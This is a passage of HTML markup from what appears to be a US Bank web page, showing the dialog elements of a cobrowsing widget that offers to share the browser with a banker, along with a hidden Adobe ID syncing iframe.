id="glance_ssn_key"></div><div id="glance_ssn_info"></div><a href="#"></a><div id="glance_tagline"><a href="#"></a><a class="tandcunderline" id="glance_terms_link">Terms and conditions</a></div><button id="glance_yes"></button><button id="glance_no"></button></div><div id="glance_msg_box" class="glance_hide glance_ui" role="dialog" tabindex="0"><p id="glance_msg"></p><button id="glance_msg_ok" tabindex="0"></button></div><div id="glance_confirm" class="glance_hide glance_ui" role="dialog" tabindex="0"><p id="glance_confirm_msg"></p></div><div id="glance_terms" class="glance_hide glance_ui" role="dialog" tabindex="0"><h2 role="heading" aria-level="2" id="glance_terms_title">Start cobrowsing</h2><p id="glance_terms_text">Would you like to share your browser with your banker?</p><button id="glance_accept" tabindex="0">Accept</button><button id="glance_decline" tabindex="0">Decline</button><br><a id="glance_terms_link2" onclick="glanceCbrUtility.openTerms();" tabindex="0">Terms and conditions</a></div><div id="glance_border"></div></div><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_usbank_0" name="destination_publishing_iframe_usbank_0_name" style="display: none; width: 0px; height: 0px;" src="assets/dest5.html" class="aamIframeLoaded"></iframe></body></html>
